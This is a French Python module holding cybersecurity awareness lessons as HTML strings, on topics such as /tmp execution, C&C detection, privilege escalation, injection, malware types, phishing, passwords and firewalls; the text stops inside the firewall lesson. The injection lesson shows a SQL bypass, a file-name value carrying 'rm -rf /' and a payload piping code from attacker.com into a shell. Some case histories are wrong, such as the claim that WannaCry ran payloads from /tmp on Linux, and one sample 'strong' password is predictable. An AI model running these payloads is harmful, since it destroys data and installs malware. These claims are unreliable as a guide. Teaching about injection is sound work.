#!/usr/bin/env python3
"""
Module de Learning - Sensibilisation et apprentissage en cybersécurité
Fournit du contenu pédagogique, des conseils et des explications détaillées
sur les menaces de sécurité.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional
from datetime import datetime


@dataclass
class LearningResource:
    """Une ressource d'apprentissage (tutoriel, conseil, explication)."""
    id: str
    title: str
    category: str  # "malware", "network", "privilege", "file", "process"
    description: str
    content: str  # Contenu HTML détaillé
    difficulty: str  # "beginner", "intermediate", "advanced"
    duration_minutes: int
    tags: List[str]
    created_at: str


@dataclass
class SecurityAlert:
    """Alerte de sécurité générée par les heuristiques."""
    id: str
    timestamp: str
    process_id: int
    process_name: str
    severity: str  # "info", "warning", "critical"
    title: str
    message: str
    triggered_rules: List[str]
    learning_resources: List[str]  # IDs des ressources d'apprentissage associées


class LearningModule:
    """Module pédagogique pour la sensibilisation en cybersécurité."""

    def __init__(self):
        self.alerts: Dict[str, SecurityAlert] = {}
        self.alert_counter = 0
        self.resources = self._initialize_resources()

    def _initialize_resources(self) -> Dict[str, LearningResource]:
        """Initialise les ressources d'apprentissage."""
        return {
            "malware_tmp_execution": LearningResource(
                id="malware_tmp_execution",
                title="Pourquoi les exécutables dans /tmp sont dangereux",
                category="malware",
                description="Comprendre les risques d'exécution depuis /tmp",
                content="""
                <h3>Exécution depuis /tmp : Un vecteur d'attaque courant</h3>
                
                <h4>Qu'est-ce que /tmp ?</h4>
                <p>/tmp est un répertoire système temporaire accessible en lecture/écriture par tous les utilisateurs.
                C'est un endroit où les programmes stockent des données transitoires.</p>
                
                <h4>Pourquoi c'est dangereux ?</h4>
                <ul>
                    <li><strong>Permissions faibles</strong> : Tout utilisateur peut y écrire</li>
                    <li><strong>Pas de surveillance</strong> : Rarement scanné par les antivirus</li>
                    <li><strong>Isolement temporaire</strong> : Les fichiers disparaissent au redémarrage (excellente pour cacher les traces)</li>
                    <li><strong>Technique de droits</strong> : Les malwares y mettent des payload à déclencher plus tard</li>
                </ul>
                
                <h4>Cas d'usage réel : Exploit EternalBlue</h4>
                <p>Lors de l'attaque WannaCry, les malwares téléchargeaient des payload dans /tmp 
                et les exécutaient avec des privilèges élevés pour propager le ransomware.</p>
                
                <h4>Comment se protéger ?</h4>
                <ul>
                    <li>✅ Ne jamais exécuter de fichiers depuis /tmp</li>
                    <li>✅ Configurer noexec sur la partition /tmp (mount -o remount,noexec /tmp)</li>
                    <li>✅ Monitorer les tentatives d'exécution depuis /tmp</li>
                    <li>✅ Vérifier les permissions et propriétaires des fichiers</li>
                </ul>
                """,
                difficulty="beginner",
                duration_minutes=5,
                tags=["malware", "permissions", "filesystem", "linux"],
                created_at=datetime.now().isoformat()
            ),
            
            "network_suspicious_ip": LearningResource(
                id="network_suspicious_ip",
                title="Détecter les connexions vers des serveurs malveillants",
                category="network",
                description="Identifier C&C et les serveurs de commande malveillants",
                content="""
                <h3>Connexions réseau suspectes : Identification de C&C</h3>
                
                <h4>Qu'est-ce qu'un serveur C&C ?</h4>
                <p>C&C (Command & Control) = serveur depuis lequel un attaquant contrôle les machines infectées.
                C'est la "tête" du botnet.</p>
                
                <h4>Indicateurs d'une connexion C&C</h4>
                <ul>
                    <li>📡 Connexions sortantes vers des IP étrangères à des ports inhabituels (4444, 8888, etc.)</li>
                    <li>🔄 Trafic périodique et régulier (beacon = "ping" périodique)</li>
                    <li>🌍 IP provenant de pays suspects ou listes noires (ISP douteuses)</li>
                    <li>🔐 Chiffrement non-standard ou obfuscation du trafic</li>
                </ul>
                
                <h4>Exemples de malwares connus utilisant C&C</h4>
                <table border="1" cellpadding="5">
                    <tr><th>Malware</th><th>C&C Typique</th><th>Ports</th></tr>
                    <tr><td>Mirai</td><td>Serveurs IRC</td><td>6667, 6697</td></tr>
                    <tr><td>Emotet</td><td>P2P masqué</td><td>443, 8080</td></tr>
                    <tr><td>Cobalt Strike</td><td>HTTPS proxy</td><td>443, 50050</td></tr>
                </table>
                
                <h4>Comment détecter une connexion C&C</h4>
                <ul>
                    <li>🔍 Vérifier les connexions sortantes de processus suspects</li>
                    <li>🔍 Consulter des listes noires d'IP malveillantes (AbuseIPDB, etc.)</li>
                    <li>🔍 Analyser le pattern de trafic : fréquence, volume, timing</li>
                    <li>🔍 Bloquer à la source via pare-feu</li>
                </ul>
                
                <h4>Action rapide</h4>
                <p>Si une connexion C&C est détectée :</p>
                <ol>
                    <li>Isoler la machine du réseau immédiatement</li>
                    <li>Noter l'IP et le port pour signalement</li>
                    <li>Analyser le processus malveillant</li>
                    <li>Nettoyer le système</li>
                </ol>
                """,
                difficulty="intermediate",
                duration_minutes=8,
                tags=["network", "c2", "botnet", "detection"],
                created_at=datetime.now().isoformat()
            ),
            
            "privilege_escalation": LearningResource(
                id="privilege_escalation",
                title="L'escalade de privilèges : Comment les attaquants deviennent administrateur",
                category="privilege",
                description="Comprendre et prévenir l'escalade de privilèges",
                content="""
                <h3>Escalade de Privilèges : Le chemin vers l'admin</h3>
                
                <h4>Qu'est-ce que l'escalade de privilèges ?</h4>
                <p>C'est quand un attaquant ou un malware passe d'un compte utilisateur normal à des droits administrateur/root.
                C'est souvent l'étape CRITIQUE d'une attaque.</p>
                
                <h4>Deux types d'escalade</h4>
                <ul>
                    <li><strong>Horizontale</strong> : Passer d'un utilisateur A à un utilisateur B au même niveau</li>
                    <li><strong>Verticale</strong> : Passer d'utilisateur normal → administrateur (plus dangereuse)</li>
                </ul>
                
                <h4>Techniques courantes d'escalade</h4>
                
                <h5>1. Vulnérabilités du noyau (Kernel Exploits)</h5>
                <p>Exploiter un bug du noyau Linux/Windows pour obtenir root</p>
                <ul>
                    <li>Exemple : CVE-2021-4034 (PwnKit) → root instantané sur Linux</li>
                    <li>Détection : Rechercher des appels système anormaux, crash du système</li>
                </ul>
                
                <h5>2. Sudo misconfigurations</h5>
                <p>Si sudo est mal configuré, un utilisateur peut exécuter n'importe quelle commande en root</p>
                <pre>visudo : ALL=(ALL) NOPASSWD: ALL  &lt;- TRES DANGEREUX !</pre>
                
                <h5>3. SUID Binaries</h5>
                <p>Les fichiers avec le bit SUID s'exécutent avec les droits du propriétaire (souvent root)</p>
                <pre>find / -perm -4000  ← Trouver tous les fichiers SUID</pre>
                
                <h5>4. Weak Permissions</h5>
                <p>Fichiers/dossiers accessibles en écriture par des non-admin</p>
                
                <h4>Comment se protéger ?</h4>
                <ul>
                    <li>✅ Maintenir le système à jour (patcher les vulnérabilités noyau)</li>
                    <li>✅ Auditer régulièrement /etc/sudoers</li>
                    <li>✅ Lister et vérifier les binaires SUID suspects</li>
                    <li>✅ Utiliser AppArmor/SELinux pour confiner les processus</li>
                    <li>✅ Ne jamais donner sudo à des applications tierces</li>
                    <li>✅ Surveiller les tentatives sudo échouées</li>
                </ul>
                
                <h4>Cas d'attaque réel : SolarWinds (2020)</h4>
                <p>Les attaquants ont exploité une vulnérabilité pour escalader vers SYSTEM,
                puis installer une porte dérobée persistante. Impact : Agences fédérales US, entreprises Fortune 500.</p>
                """,
                difficulty="advanced",
                duration_minutes=10,
                tags=["privilege", "sudo", "suid", "kernel", "vulnerability"],
                created_at=datetime.now().isoformat()
            ),
            
            "unsigned_binary": LearningResource(
                id="unsigned_binary",
                title="Binaires non signés : Vérifier l'authenticité des programmes",
                category="file",
                description="Pourquoi les signatures numériques sont importantes",
                content="""
                <h3>Binaires Non Signés : Un signal d'alerte</h3>
                
                <h4>Qu'est-ce qu'une signature numérique ?</h4>
                <p>Une signature numérique est un certificat cryptographique attestant que :</p>
                <ul>
                    <li>✅ Le fichier vient effectivement de l'éditeur annoncé</li>
                    <li>✅ Le fichier n'a pas été modifié depuis la signature</li>
                    <li>✅ L'éditeur est une entité vérifiée par une autorité de confiance</li>
                </ul>
                
                <h4>Pourquoi un binaire SANS signature est suspect</h4>
                <ul>
                    <li>❌ Pas d'origine vérifiée (pourrait être un malware déguisé)</li>
                    <li>❌ Pas de garantie d'intégrité (pu être modifié en chemin)</li>
                    <li>❌ Pas de responsabilité légale (l'auteur ne s'engage pas)</li>
                </ul>
                
                <h4>Exemples réels</h4>
                <ul>
                    <li><strong>Logiciels légitimes</strong> : Chrome, Firefox, VS Code → SIGNÉS par Google, Mozilla, Microsoft</li>
                    <li><strong>Malwares</strong> : Trojan.GenericKD → Non signé, obfusqué, chemin bizarre</li>
                    <li><strong>Open Source</strong> : Certains projets libres ne signent pas (risqué pour les utilisateurs)</li>
                </ul>
                
                <h4>Comment vérifier une signature sur Linux</h4>
                <pre>
# Vérifier les signatures d'un binaire
gpg --verify programme.sig programme.bin

# Sur Windows avec sigcheck (SysInternals)
sigcheck.exe programme.exe
                </pre>
                
                <h4>Bonne pratique : Code Signing</h4>
                <p>Les éditeurs responsables SIGNENT toujours leurs binaires avec un certificat d'une autorité reconnue.</p>
                <ul>
                    <li>💰 Coûte de l'argent (30-500 $/an pour un certificat)</li>
                    <li>📋 Dossier KYC stricte avec autorité CA</li>
                    <li>⏰ Temps d'attente pour obtenir le certificat</li>
                </ul>
                
                <h4>Conseils de sécurité</h4>
                <ul>
                    <li>✅ Télécharger les logiciels UNIQUEMENT depuis sites officiels</li>
                    <li>✅ Vérifier la signature du fichier téléchargé</li>
                    <li>✅ Si pas de signature = risque accru, valider le hash sur plusieurs sources</li>
                    <li>✅ Windows SmartScreen et reputation scores sont utiles (mais pas suffisants)</li>
                </ul>
                """,
                difficulty="beginner",
                duration_minutes=6,
                tags=["signature", "authentication", "integrity", "code-signing"],
                created_at=datetime.now().isoformat()
            ),
            
            "process_monitoring": LearningResource(
                id="process_monitoring",
                title="Monitoring des processus : Votre première ligne de défense",
                category="process",
                description="Comment surveiller les processus pour détecter les anomalies",
                content="""
                <h3>Monitoring des Processus : La Première Ligne de Défense</h3>
                
                <h4>Pourquoi monitorer les processus ?</h4>
                <p>Chaque programme qui s'exécute = chaque malware possible. Le monitoring des processus est
                l'une des techniques EDRS (Endpoint Detection and Response) les plus efficaces.</p>
                
                <h4>Que monitorer ?</h4>
                <ul>
                    <li>📊 <strong>CPU/Mémoire</strong> : Pic anormal = crypto-miner ou leak ?</li>
                    <li>🌐 <strong>Réseau</strong> : Connexions sortantes non autorisées</li>
                    <li>💾 <strong>Disque</strong> : Lecture/écriture massive</li>
                    <li>👨‍💼 <strong>Utilisateur/Parent</strong> : Qui a lancé ce processus ? Depuis où ?</li>
                    <li>📁 <strong>Chemin d'exécution</strong> : /tmp, /dev/shm, C:\\Users\\...\\AppData\\ ?</li>
                    <li>🔧 <strong>Arguments CLI</strong> : PowerShell -NoProfile -Command IEX(...) ?</li>
                </ul>
                
                <h4>Signaux d'alerte classiques</h4>
                <table border="1" cellpadding="5">
                    <tr>
                        <th>Signal</th>
                        <th>Risque</th>
                        <th>Exemple</th>
                    </tr>
                    <tr>
                        <td>CPU > 80% soudain</td>
                        <td>Crypto-miner, scanner</td>
                        <td>svchost.exe à 95% CPU</td>
                    </tr>
                    <tr>
                        <td>Parent étrange</td>
                        <td>Process injection</td>
                        <td>PowerShell parent = services.exe</td>
                    </tr>
                    <tr>
                        <td>Chemin /tmp, %temp%</td>
                        <td>Malware téléchargé</td>
                        <td>./malware.sh depuis /tmp</td>
                    </tr>
                    <tr>
                        <td>Port réseau élevé</td>
                        <td>C&C beacon</td>
                        <td>Connexion 42.x.x.x:8888</td>
                    </tr>
                </table>
                
                <h4>Outils de monitoring</h4>
                <ul>
                    <li><strong>Linux</strong> : htop, ps, strace, auditd</li>
                    <li><strong>Windows</strong> : Task Manager, Process Monitor (Sysinternals), Windows Event Log</li>
                    <li><strong>Crossplatform</strong> : Learn-Protect (ce tool !), Zeek, Sysmon</li>
                </ul>
                
                <h4>Bonnes pratiques</h4>
                <ul>
                    <li>✅ Monitorer 24/7, ne jamais ignorer les alertes</li>
                    <li>✅ Créer une baseline : quels processus normalement présents ?</li>
                    <li>✅ Avoir un SOC (Security Operations Center) pour analyser les alertes</li>
                    <li>✅ Logging centralisé : envoyer les logs vers un SIEM</li>
                    <li>✅ Être pédagogique : former les utilisateurs à reconnaître les anomalies</li>
                </ul>
                
                <h4>Cas réel : WannaCry (2017)</h4>
                <p>Des équipes SANS monitoring de processus n'ont pas vu le malware spawner
                des processus enfants massifs avant que 200,000 machines soient compromises.
                Leçon : Le monitoring existait, mais pas d'alerte en temps réel.</p>
                """,
                difficulty="intermediate",
                duration_minutes=9,
                tags=["process", "monitoring", "detection", "anomaly"],
                created_at=datetime.now().isoformat()
            ),
            
            "injection_attack": LearningResource(
                id="injection_attack",
                title="Attaques par Injection : SQL, Command, Code",
                category="malware",
                description="Comprendre les attaques par injection et leurs variantes",
                content="""
                <h3>Attaques par Injection : Code Malveillant dans les Données</h3>
                
                <h4>Qu'est-ce qu'une injection ?</h4>
                <p>Une injection = insertion de code malveillant DANS les données d'entrée d'une application.
                L'app croit que c'est une donnée normale, mais c'est du code qui s'exécute.</p>
                
                <h4>Les 3 Types Principaux</h4>
                
                <h5>1. SQL Injection</h5>
                <p><strong>Impact</strong> : Vol de données, suppression de BDD, accès administrateur</p>
                <pre>Entée normale : email = 'user@example.com'
Injection SQL : email = ' OR '1'='1</pre>
                <p>La requête devient : <code>SELECT * FROM users WHERE email = '' OR '1'='1'</code>
                Résultat : Tous les utilisateurs retournés au lieu d'un seul !</p>
                
                <h5>2. Command Injection</h5>
                <p><strong>Impact</strong> : Exécution de commandes système avec les droits de l'app</p>
                <pre>Entée : fichier = 'document.pdf'
Injection : fichier = 'document.pdf; rm -rf /'</pre>
                <p>La commande s'exécute et le serveur est briqué !</p>
                
                <h5>3. Code Injection</h5>
                <p><strong>Impact</strong> : Exécution de code arbitraire (PHP, Python, JavaScript...)</p>
                <pre>eval('user_input')  // DANGER !
Entrée malveillante : import os; os.system('curl attacker.com/malware.sh | sh')</pre>
                
                <h4>Cas Réels</h4>
                <ul>
                    <li><strong>Target (2013)</strong> : SQL injection → Vol de 40M cartes bancaires</li>
                    <li><strong>Yahoo (2014)</strong> : Accès à 500M comptes</li>
                    <li><strong>Equifax (2017)</strong> : 147M personnes affectées</li>
                </ul>
                
                <h4>Comment se protéger</h4>
                <ul>
                    <li>✅ <strong>Parameterized Queries</strong> : Séparer code et données</li>
                    <li>✅ <strong>Input Validation</strong> : Vérifier et nettoyer les entrées</li>
                    <li>✅ <strong>Whitelist Approach</strong> : Autoriser SEULEMENT le valide</li>
                    <li>✅ <strong>Principle of Least Privilege</strong> : App avec droits minimums</li>
                    <li>✅ <strong>WAF (Web Application Firewall)</strong> : Bloquer les patterns suspects</li>
                </ul>
                """,
                difficulty="intermediate",
                duration_minutes=12,
                tags=["injection", "sql", "command", "code", "vulnerability"],
                created_at=datetime.now().isoformat()
            ),
            
            "malware_types": LearningResource(
                id="malware_types",
                title="Types de Malwares : Virus, Worms, Trojans, Ransomware",
                category="malware",
                description="Classification et caractéristiques des différents types de malwares",
                content="""
                <h3>Taxonomie des Malwares : Comprendre l'Ennemi</h3>
                
                <h4>1. Virus</h4>
                <p><strong>Définition</strong> : Code qui se reproduit en s'attachant à d'autres fichiers</p>
                <ul>
                    <li>📁 Se propage via fichiers partagés</li>
                    <li>❌ Nécessite une action utilisateur (exécution du fichier)</li>
                    <li>💾 Persistant : survit au redémarrage (peut se cacher)</li>
                    <li>⚡ Peut être très destructeur (supprimer des fichiers, corruption)</li>
                </ul>
                <p><strong>Exemple</strong> : ILOVEYOU (2000), Storm worm (2006)</p>
                
                <h4>2. Worms (Vers)</h4>
                <p><strong>Définition</strong> : Malware autonome qui se propage sans action utilisateur</p>
                <ul>
                    <li>🌍 Se propage via réseau (email, fichiers partagés, vulnérabilités)</li>
                    <li>⚙️ Aucune interaction requise = très rapide</li>
                    <li>🔗 Se réplique exponentiellement</li>
                    <li>💣 Peut surcharger les réseaux ou serveurs</li>
                </ul>
                <p><strong>Exemple</strong> : Morris Worm (1988), Conficker (2008), WannaCry (2017)</p>
                
                <h4>3. Trojans (Chevaux de Troie)</h4>
                <p><strong>Définition</strong> : Malware déguisé en application légitime</p>
                <ul>
                    <li>🎭 Semble utile : "gratuit antivirus", "media player", "crack")
                    <li>🚪 Ouvre une porte dérobée pour attaquants</li>
                    <li>🕵️ Vole données, installe backdoor, crypte les fichiers</li>
                    <li>🤖 Peut être contrôlé à distance (Remote Access Trojan = RAT)</li>
                </ul>
                <p><strong>Exemple</strong> : Zeus (2006), Emotet (2014), TrickBot (2016)</p>
                
                <h4>4. Ransomware</h4>
                <p><strong>Définition</strong> : Malware qui crypte vos fichiers et demande rançon</p>
                <ul>
                    <li>🔐 Chiffre tous les fichiers avec clé inconnue</li>
                    <li>💰 Demande paiement en crypto-monnaie</li>
                    <li>⏰ Deadline : "Payez en 72h ou données effacées"</li>
                    <li>😈 Double extortion : Vole + crypte + menace de publier</li>
                </ul>
                <p><strong>Exemple</strong> : WannaCry (2017, 4B$ impact), Ryuk (2018), DarkSide (2020)</p>
                
                <h4>5. Spyware & Adware</h4>
                <p><strong>Spyware</strong> : Surveille vos actions (keylogger, screenshare, capture caméra)</p>
                <p><strong>Adware</strong> : Affiche publicités envahissantes ou redirige vers sites malveillants</p>
                
                <h4>6. Cryptominers</h4>
                <p><strong>Définition</strong> : Utilise votre CPU/GPU pour miner des crypto-monnaies</p>
                <ul>
                    <li>💪 CPU à 100% → performance lente</li>
                    <li>🔥 Surchauffe la machine</li>
                    <li>💡 Facture d'électricité explosée</li>
                    <li>⛏️ Attaquant gagne de l'argent = vous perdez</li>
                </ul>
                
                <h4>Tableau Comparatif</h4>
                <table border="1" cellpadding="8">
                    <tr>
                        <th>Type</th>
                        <th>Propagation</th>
                        <th>Autonome</th>
                        <th>Dégâts Typiques</th>
                    </tr>
                    <tr>
                        <td>Virus</td>
                        <td>Fichiers</td>
                        <td>Non</td>
                        <td>Corruption, vol</td>
                    </tr>
                    <tr>
                        <td>Worm</td>
                        <td>Réseau</td>
                        <td>OUI</td>
                        <td>Saturation réseau</td>
                    </tr>
                    <tr>
                        <td>Trojan</td>
                        <td>Social eng.</td>
                        <td>Non</td>
                        <td>Vol, backdoor</td>
                    </tr>
                    <tr>
                        <td>Ransomware</td>
                        <td>Email/Web</td>
                        <td>Non</td>
                        <td>Chiffrement, rançon</td>
                    </tr>
                </table>
                """,
                difficulty="intermediate",
                duration_minutes=14,
                tags=["malware", "virus", "worm", "trojan", "ransomware"],
                created_at=datetime.now().isoformat()
            ),
            
            "phishing_social_eng": LearningResource(
                id="phishing_social_eng",
                title="Phishing et Ingénierie Sociale : Manipuler l'Utilisateur",
                category="malware",
                description="Comment les attaquants trompent les humains pour accéder aux systèmes",
                content="""
                <h3>Phishing & Ingénierie Sociale : L'Humain est le Maillon Faible</h3>
                
                <h4>Qu'est-ce que le Phishing ?</h4>
                <p><strong>Phishing</strong> = Email frauduleux qui prétend venir d'une source de confiance
                pour vous voler identifiants, argent, ou données.</p>
                
                <h4>Types de Phishing</h4>
                
                <h5>1. Email Phishing (Classique)</h5>
                <pre>De: noreply@bank-fr.com
Sujet: Urgence - Vérifier votre compte
Contenu: "Votre compte a été accédé. Cliquez ici pour confirmer."
Lien: http://fake-bank-fr.com (pas https://bank-fr.com!)
                </pre>
                <p>L'utilisateur clique → Se connecte sur site fake → Attaquant récupère credentials</p>
                
                <h5>2. Spear Phishing (Ciblé)</h5>
                <p>Phishing personnalisé ET ciblé sur une personne/entreprise spécifique</p>
                <pre>De: john.manager@realcompany.com (spoofé)
Sujet: Action rapide requise - Transfert urgent
Contenu: "Chef, besoin de transférer 50k€ maintenant..."</pre>
                <p>Plus crédible = taux de succès +40%</p>
                
                <h5>3. Whaling (Ciblage Hauts Cadres)</h5>
                <p>Phishing ultra-ciblé vers PDG/CFO/CTO avec recherche approfondie
                (LinkedIn, Twitter, articles de presse)</p>
                
                <h5>4. Smishing (SMS/WhatsApp)</h5>
                <pre>SMS: "Vous avez un colis - Cliquez: bit.ly/fake-link"
WhatsApp: "Amazon - Colis bloqué, confirmez: fake.com"</pre>
                
                <h5>5. Vishing (Voice Phishing)</h5>
                <p>Appel téléphonique frauduleux : "Bonjour, c'est Franck du support IT..."</p>
                
                <h4>Ingénierie Sociale (Social Engineering)</h4>
                <p><strong>Définition</strong> : Manipulation psychologique pour contourner la sécurité</p>
                
                <h5>Techniques Courantes</h5>
                <ul>
                    <li><strong>Prétexte</strong> : "Je suis du support informatique, besoin du mot de passe"</li>
                    <li><strong>Urgence</strong> : "URGENCE ! Votre compte sera supprimé dans 1h"</li>
                    <li><strong>Autorité</strong> : "C'est le patron qui demande"</li>
                    <li><strong>Confiance</strong> : Se faire passer pour un ami/collègue</li>
                    <li><strong>Curiosité</strong> : "Regardez cette vidéo étrange..."</li>
                    <li><strong>Avantage</strong> : "Gagnez un iPhone gratuit !"</li>
                </ul>
                
                <h4>Signaux d'Alerte 🚩</h4>
                <ul>
                    <li>❌ Email du "support" vous demande password</li>
                    <li>❌ Urgence artificielle ou menace</li>
                    <li>❌ Domaine email légèrement différent (gogle.com au lieu de google.com)</li>
                    <li>❌ Lien qui n'est pas le vrai site (hovérez pour voir)</li>
                    <li>❌ Pièces jointes .exe, .zip, .scr, .bat</li>
                    <li>❌ Erreurs de grammaire/orthographe</li>
                    <li>❌ Demande de paiement par prépayé/crypto</li>
                </ul>
                
                <h4>Comment se Protéger</h4>
                <ul>
                    <li>✅ <strong>Vérifier l'expéditeur</strong> : Vrai domaine, pas @gmail.com</li>
                    <li>✅ <strong>Hovérer sur les liens</strong> : Voir la vraie URL</li>
                    <li>✅ <strong>Ne pas cliquer trop vite</strong> : Prendre 5 secondes</li>
                    <li>✅ <strong>Appeler directement</strong> : Si doute, call la compagnie</li>
                    <li>✅ <strong>2FA partout</strong> : Même si credentials compromises</li>
                    <li>✅ <strong>Formation régulière</strong> : Best defense = utilisateurs informés</li>
                    <li>✅ <strong>Simulations phishing</strong> : Tester les employés</li>
                </ul>
                
                <h4>Cas Réels Récents</h4>
                <p><strong>Google Employees (2017)</strong> : 100M$ volés via phishing dirigé vers finance dept
                <br><strong>Twitter (2020)</strong> : Accounts VIPs hackés (Obama, Elon Musk) via phishing internal</p>
                """,
                difficulty="beginner",
                duration_minutes=11,
                tags=["phishing", "social-engineering", "email", "scam"],
                created_at=datetime.now().isoformat()
            ),
            
            "password_security": LearningResource(
                id="password_security",
                title="Sécurité des Mots de Passe : Créer et Protéger",
                category="file",
                description="Bonnes pratiques pour des mots de passe forts et uniques",
                content="""
                <h3>Mots de Passe Forts : Votre Première Défense</h3>
                
                <h4>Pourquoi les Mots de Passe Sont Importants</h4>
                <p>Un mot de passe = seule chose entre vous et attaquant qui contrôle votre compte</p>
                <ul>
                    <li>💀 80% des breaches = mots de passe faibles/réutilisés</li>
                    <li>🔨 Un GPU peut tester 14 milliards mdp/seconde (brute force)</li>
                    <li>📊 "password" reste le #1 mdp utilisé en 2024</li>
                </ul>
                
                <h4>Caractéristiques d'un Bon Mot de Passe</h4>
                <table border="1" cellpadding="8">
                    <tr>
                        <th>Critère</th>
                        <th>Mauvais ❌</th>
                        <th>Bon ✅</th>
                    </tr>
                    <tr>
                        <td>Longueur</td>
                        <td>123456 (6 chars)</td>
                        <td>MinimumDe16Caractères!</td>
                    </tr>
                    <tr>
                        <td>Complexité</td>
                        <td>password</td>
                        <td>P@ssw0rd!2025#Secure</td>
                    </tr>
                    <tr>
                        <td>Unicité</td>
                        <td>Même partout</td>
                        <td>Unique par site/app</td>
                    </tr>
                    <tr>
                        <td>Personnel</td>
                        <td>john1990 (facile)</td>
                        <td>Aléatoire ou phrase</td>
                    </tr>
                </table>
                
                <h4>Formules de Mots de Passe Forts</h4>
                
                <h5>Option 1 : Aléatoire (MEILLEUR)</h5>
                <pre>xK8#mP2$nL5@qR7%vT9</pre>
                <p>Utiliser un générateur aléatoire + Password Manager</p>
                
                <h5>Option 2 : Passphrase (Plus Mémorisable)</h5>
                <pre>Quoi|M0nChien-MangeLeJeudi+2025!</pre>
                <p>Prendre une phrase = facile à retenir, difficile à craquer</p>
                <p>Avec substitution : 0=O, 1=i, 4=A, 5=S, 7=T, @=a, !=$</p>
                
                <h5>Option 3 : Détournement de Phrase</h5>
                <pre>"Mon premier job en 1990 payait 15k€" → MpJe1990P15ke€!</pre>
                
                <h4>Attaques Courantes Contre les Mots de Passe</h4>
                
                <h5>1. Brute Force</h5>
                <p>Essayer toutes les combinaisons possible = très lent pour mdp long
                <br>6 chars : craqué en secondes
                <br>16 chars : années de computation</p>
                
                <h5>2. Dictionary Attack</h5>
                <p>Utiliser dictionnaire + mots courants
                <br>Beaucoup plus rapide que brute force</p>
                
                <h5>3. Rainbow Tables</h5>
                <p>Pré-calculer les hashes de millions de mdp courants
                <br>Lookup rapide : hash connu? → mdp trouvé</p>
                
                <h5>4. Phishing / Social Engineering</h5>
                <p>Faire croire à l'utilisateur qu'il doit donner son mdp</p>
                
                <h4>Meilleures Pratiques</h4>
                <ul>
                    <li>✅ <strong>Longueur PRIORITAIRE</strong> : 16+ caractères minimum</li>
                    <li>✅ <strong>Majuscules + minuscules + chiffres + symboles</strong></li>
                    <li>✅ <strong>Unique par site/service</strong> : Ne pas réutiliser</li>
                    <li>✅ <strong>Password Manager</strong> : Keepass, 1Password, BitWarden</li>
                    <li>✅ <strong>2FA (Two-Factor Authentication)</strong> : Toujours!</li>
                    <li>✅ <strong>Changer si leak connu</strong> : Vérifier haveibeenpwned.com</li>
                    <li>✅ <strong>Jamais par email/SMS/chat</strong> : Communiquer mdp de vive voix</li>
                </ul>
                
                <h4>Comment Choisir un Bon Password Manager</h4>
                <ul>
                    <li>🔐 <strong>BitWarden</strong> : Open source, gratuit, cloud/self-hosted</li>
                    <li>🔐 <strong>KeePass</strong> : Local seulement, ultra-sécurisé</li>
                    <li>🔐 <strong>1Password</strong> : Premium mais très convivial</li>
                    <li>❌ Éviter : Google Password Manager (optionnel), browsers par défaut</li>
                </ul>
                """,
                difficulty="beginner",
                duration_minutes=10,
                tags=["password", "authentication", "security", "2fa"],
                created_at=datetime.now().isoformat()
            ),
            
            "firewall_basics": LearningResource(
                id="firewall_basics",
                title="Firewall 101 : Votre Première Barrière",
                category="network",
                description="Comprendre les pare-feu et la protection réseau de base",
                content="""
                <h3>Firewall : Le Policier de Votre Réseau</h3>
                
                <h4>Qu'est-ce qu'un Firewall ?</h4>
                <p>Un firewall = filtre qui décide QUEL trafic réseau est autorisé ou bloqué</p>
                <ul>
                    <li>🚧 Siège à la frontière (entre interne et internet)</li>
                    <li>📋 Évalue les règles pour chaque paquet</li>
                    <li>✅ Laisse passer le "bon" trafic</li>
                    <li>❌ Bloque le "mauvais" trafic</li>
                </ul>
                
                <h4>Deux Types de Firewall</h4>
                
                <h5>1. Firewall Hôte (Host-based)</h5>
                <p>Logiciel installé sur CHAQUE machine
                <br>Exemples : Windows Firewall, macOS firewall, iptables (Linux), UFW</p>
                <ul>
                    <li>✅ Protège cette machine spécifiquement</li>
                    <li>✅ Granularité applicative (bloquer app X, pas app Y)</li>
                    <li>✅ Survit au déplacement réseau</li>
                    <li>❌ À configurer/maintenir sur chaque PC</li>
                </ul>
                
                <h5>2. Firewall Réseau (Network Firewall)</h5>
                <p>Équipement centralisé à l'entrée du réseau
                <br>Exemples : Cisco ASA, Palo Alto, Fortinet FortiGate, pfSense</p>
                <ul>
                    <li>✅ Protège tout le réseau d'un coup</li>
                    <li>✅ Contrôle centralisé et logging</li>
                    <li>✅ Peut inspecter le contenu (DPI)</li>
                    <li>❌ Cher à installer/maintenir</li>
                </ul>
                
                <h4>Comment Fonctionne un Firewall</h4>
                
                <h5>Stateless (Simple)</h5>
                <p>Vérifie chaque paquet indépendamment
                <br>Règles : port, protocole, IP source/destination</p>
                <pre>RULE 1: Bloquer 0.0.0.0/0 port 23 (Telnet)
RULE 2: Permettre 0.0.0.0/0 port 443 (HTTPS)
RULE 3: Permettre 192.168.1.0/24 port 3306 (MySQL)</pre>
                
                <h5>Stateful (Intelligent)</h5>
                <p>Suit les connexions = plus sûr
                <br>Ex: Si connexion initiée interne → accepter réponse externe</p>
                
                <h4>Règles Firewall Essentielles</h4>
                
                <h5>Inbound (Entrant du Web)</h5>
                <ul>
                    <li>❌ Bloquer par défaut (deny all)</li>
                    <li>✅ Permettre seulement ports nécessaires (80, 443, 22 si admin)</li>
                    <li>✅ Limiter source si possible (Ex: VPN IP only)</li>
                </ul>
                
                <h5>Outbound (Sortant vers Web)</h5>
                <ul>
                    <li>✅ Permettre par défaut (allow all) OU</li>
                    <li>✅ Bloquer seulement ports suspects (non-standard)</li>
                    <li>✅ Bloquer pays blacklistés (Geo-blocking)</li>
                </ul>
                
                <h4>Cas d'Usage Réel : Configuration Basique Linux</h4>
                <pre>
# Bloquer tout par défaut
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Permettre SSH (admin only)
sudo ufw allow from 203.0.113.0/24 to any port 22/tcp

# Permettre HTTP/HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Activer
sudo ufw enable
                </pre>
                
                <h4>Firewall Avancé : Stateful Inspection</h4>
                <p>Inspectionner le CONTENU du trafic (pas juste header)
                <br>Détecter : malware, commandes C&C, exfiltration de données</p>
                <ul>
                    <li>🔍 Deep Packet Inspection (DPI)</li>
                    <li>🔍 Intrusion Prevention System (IPS)</li>
                    <li>🔍 Web Application Firewall (WAF)</li>
                </ul>
                
                <h4>Limitations du Firewall</h4>
                <p>Le firewall <strong>NE</strong> protège pas contre :</p>
                <ul>
                    <li>❌ Malware déjà INSIDE le réseau</li>
                    <li>❌ Attaques via tunnel (VPN, HTTPS chiffré)</li>
                    <li>❌ User erreur (phishing, bad config)</li>
                    <li>❌ Attaques au niveau application (SQL injection)</li>
                </ul>
